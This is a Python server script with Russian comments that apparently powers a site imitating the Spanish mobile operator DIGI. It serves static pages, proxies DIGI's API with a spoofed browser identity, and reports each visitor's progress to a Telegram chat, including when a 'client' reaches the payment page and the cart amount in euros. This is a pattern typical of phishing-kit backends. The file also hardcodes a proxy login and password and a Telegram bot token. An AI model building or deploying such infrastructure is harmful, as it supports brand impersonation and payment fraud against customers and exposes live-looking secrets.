#!/usr/bin/env python3
"""
HTTP server for Railway deployment with integrated CORS proxy
"""
import os
import time
import http.server
import socketserver
import json
import urllib.parse
from pathlib import Path
from urllib.request import Request, build_opener, ProxyHandler as UrllibProxyHandler, HTTPBasicAuthHandler, HTTPPasswordMgrWithDefaultRealm, urlopen

# Получаем порт из переменной окружения или используем 8000 по умолчанию
PORT = int(os.environ.get('PORT', 8000))

# Устанавливаем директорию для сервера
DIRECTORY = Path(__file__).parent

# Настройки внешнего прокси (опционально, можно использовать без прокси)
PROXY_HOST = '185.162.130.86'
PROXY_PORT = 10000
PROXY_USER = 'UInVgOaurISMxHUOMkfD'
PROXY_PASS = 'xnElmQSosaC9sekBD1SRzgqgBWcj2HsZ'
USE_PROXY = False  # Можно включить если нужен внешний прокси

# Настройки Telegram бота
TELEGRAM_BOT_TOKEN = '8392428090:AAHolHKxi2LUp9OJGa3AsoCrRPByp31cPj0'
TELEGRAM_CHAT_ID = '-5029803929'
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'

# Хранилище для защиты от дубликатов (в памяти, для production лучше использовать Redis/DB)
notification_cache = {}

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(DIRECTORY), **kwargs)
    
    def do_GET(self):
        # Обрабатываем запросы к прокси API
        if self.path.startswith('/api/proxy/'):
            self.handle_proxy_request()
        else:
            # Обычная обработка статических файлов
            super().do_GET()
    
    def do_POST(self):
        # Обрабатываем запросы к Telegram API
        if self.path == '/api/telegram/notify':
            self.handle_telegram_notify()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_OPTIONS(self):
        # Обработка CORS preflight запросов
        if self.path.startswith('/api/proxy/') or self.path == '/api/telegram/notify':
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.end_headers()
        else:
            super().do_OPTIONS()
    
    def handle_proxy_request(self):
        """Обработка прокси-запросов к API DIGI"""
        try:
            # Извлекаем путь API из запроса
            api_path = self.path.replace('/api/proxy/', '')
            target_url = f'https://www.digimobil.es/api/v1/{api_path}'
            
            # Создаем запрос
            req = Request(target_url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
            req.add_header('Accept-Language', 'es-ES,es;q=0.9')
            
            # Выполняем запрос (с прокси или без)
            if USE_PROXY:
                # Настраиваем прокси с аутентификацией
                proxy_handler = UrllibProxyHandler({
                    'http': f'http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}',
                    'https': f'http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}'
                })
                password_mgr = HTTPPasswordMgrWithDefaultRealm()
                password_mgr.add_password(None, f'http://{PROXY_HOST}:{PROXY_PORT}', PROXY_USER, PROXY_PASS)
                password_mgr.add_password(None, f'https://{PROXY_HOST}:{PROXY_PORT}', PROXY_USER, PROXY_PASS)
                auth_handler = HTTPBasicAuthHandler(password_mgr)
                opener = build_opener(proxy_handler, auth_handler)
                response = opener.open(req, timeout=20)
            else:
                # Прямой запрос без прокси
                from urllib.request import urlopen
                response = urlopen(req, timeout=20)
            
            content = response.read()
            content_type = response.headers.get('Content-Type', 'text/html; charset=utf-8')
            
            # Отправляем ответ с CORS заголовками
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            self.wfile.write(content)
            
        except Exception as e:
            # Обработка ошибок
            print(f"Proxy error: {str(e)}")
            self.send_response(500)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            error_msg = f'Error: {str(e)}'
            self.wfile.write(error_msg.encode('utf-8'))
    
    def handle_telegram_notify(self):
        """Обработка запросов на отправку уведомлений в Telegram"""
        try:
            # Читаем тело запроса
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Извлекаем данные
            event_type = data.get('event_type')  # 'home', 'tariff', 'payment'
            client_id = data.get('client_id')
            country = data.get('country', 'Неизвестно')
            device = data.get('device', 'Неизвестно')
            amount = data.get('amount')  # Только для payment
            
            # Проверка защиты от дубликатов (30 минут)
            cache_key = f"{event_type}_{client_id}"
            current_time = time.time()
            
            if cache_key in notification_cache:
                last_time = notification_cache[cache_key]
                if current_time - last_time < 1800:  # 30 минут = 1800 секунд
                    # Дубликат, игнорируем
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status': 'duplicate', 'message': 'Notification already sent'}).encode('utf-8'))
                    return
            
            # Формируем сообщение в зависимости от типа события
            message = ""
            if event_type == 'home':
                message = f"🌐 Новый посетитель на сайте!\n\n🆔 ID: {client_id}\n🌍 Страна: {country}\n🖥 Устройство: {device}"
            elif event_type == 'tariff':
                message = f"🌐 {client_id} клиент находится на странице выбора тарифа.\n\n🌍 Страна: {country}"
            elif event_type == 'payment':
                message = f"💳 {client_id} клиент перешёл на страницу оплаты.\n\n💲 Сумма корзины: {amount} EUR"
            else:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'error', 'message': 'Invalid event_type'}).encode('utf-8'))
                return
            
            # Отправляем сообщение в Telegram
            telegram_data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': message,
                'parse_mode': 'HTML'
            }
            
            telegram_request = Request(
                TELEGRAM_API_URL,
                data=json.dumps(telegram_data).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            
            telegram_response = urlopen(telegram_request, timeout=10)
            telegram_result = json.loads(telegram_response.read().decode('utf-8'))
            
            # Сохраняем в кэш
            notification_cache[cache_key] = current_time
            
            # Очистка старых записей из кэша (старше 1 часа)
            for key in list(notification_cache.keys()):
                if current_time - notification_cache[key] > 3600:
                    del notification_cache[key]
            
            # Отправляем ответ клиенту
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success', 'telegram_result': telegram_result.get('ok', False)}).encode('utf-8'))
            
        except Exception as e:
            print(f"Telegram notify error: {str(e)}")
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            error_msg = json.dumps({'status': 'error', 'message': str(e)})
            self.wfile.write(error_msg.encode('utf-8'))
    
    def log_message(self, format, *args):
        # Логируем только важные сообщения
        if '404' in format or '500' in format or '/api/proxy' in format or '/api/telegram' in format:
            print(f"{self.address_string()} - {format % args}")

if __name__ == '__main__':
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Server starting on port {PORT}")
        print(f"Serving directory: {DIRECTORY}")
        print(f"Proxy enabled: {USE_PROXY}")
        httpd.serve_forever()

